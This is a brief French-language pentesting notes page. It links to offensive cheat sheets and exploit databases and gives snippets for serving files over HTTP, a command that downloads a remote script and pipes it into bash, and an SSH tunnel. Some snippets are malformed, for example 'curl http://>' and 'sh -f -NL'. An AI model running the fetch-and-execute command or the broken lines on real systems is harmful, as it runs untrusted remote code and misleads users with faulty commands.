# Utils

## Ressources

* [https://swisskyrepo.github.io/PayloadsAllTheThings/](https://swisskyrepo.github.io/PayloadsAllTheThings/)
* [https://swisskyrepo.github.io/InternalAllTheThings/](https://swisskyrepo.github.io/InternalAllTheThings/)
* [https://cheatsheet.haax.fr/](https://cheatsheet.haax.fr/)
* [https://book.hacktricks.wiki/en/index.html](https://book.hacktricks.wiki/en/index.html)
* [https://github.com/saisathvik1/OSCP-Cheatsheet](https://github.com/saisathvik1/OSCP-Cheatsheet)
* [https://84z2h.gitbook.io/selfnote](https://84z2h.gitbook.io/selfnote)
* [https://www.exploit-db.com/](https://www.exploit-db.com/)
* [https://pentestmonkey.net/](https://pentestmonkey.net/)

## Host un serveur web pour dl des fichiers

```bash
python3 -m http.server 80 -d <chemin> 
curl http://>
wget http://>
```

## Exécuter un script Bash

```bash
cat script.sh | bash
curl http://<ip>/script.sh | bash
```

## Tunnels SSH

```bash
sh -f -NL 1234:localhost:5432 user@IP
```
